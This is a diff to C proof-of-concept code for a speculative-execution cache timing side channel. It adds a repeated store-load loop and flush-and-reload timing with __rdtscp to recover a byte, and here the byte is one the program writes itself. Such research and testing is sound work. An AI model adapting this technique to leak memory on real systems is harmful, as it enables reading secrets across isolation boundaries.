@@ -65,7 +65,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 
   for (i = 0; i < 256; i++)
     results[i] = 0;
-  for (tries = 1; tries > 0; tries--) {
+  for (tries = 999; tries > 0; tries--) {
       
     results[0] = 0;
     /* Flush big array[4096*(0..255)] from cache */
@@ -78,14 +78,20 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         
     /* Call the victim! */
     //victim_function(); //store in big[0]
-    bigArray[0] = 'q';
+    
+    
+    for (j = 29; j >= 0; j--) {
+        for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */
 
-    addr = &bigArray[4096];
+        /* Call the victim! */
+        addr = &bigArray[4096];
 
-    data = *addr;
-    //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
-    printf("data is %c = %d", data, data);
-    temp &= array2[data * 512];
+        bigArray[0] = 'q';
+
+        data = *addr;
+        //Now the data from bigArray[0] is supposed to temporarily be in (data) so we will access this point
+        temp &= array2[data * 512];
+    }
 
     //Now we accessed the point in the memory that is correlated with the data in big[0]
     //Now we can see in which place in array2 we have a speed up
@@ -99,8 +105,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
         time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
         if (time2 <= CACHE_HIT_THRESHOLD ) { //TODO: also check it is not the thing in 4096
             results[mix_i]++; /* cache hit - add +1 to score for this value */
-            printf("got here with: %d after cycles:", mix_i);
-            printf("%" PRId64 "\n", time2);
+            //printf("got here with: %d after cycles:", mix_i);
+            //printf("%" PRId64 "\n", time2);
 
         }
     }
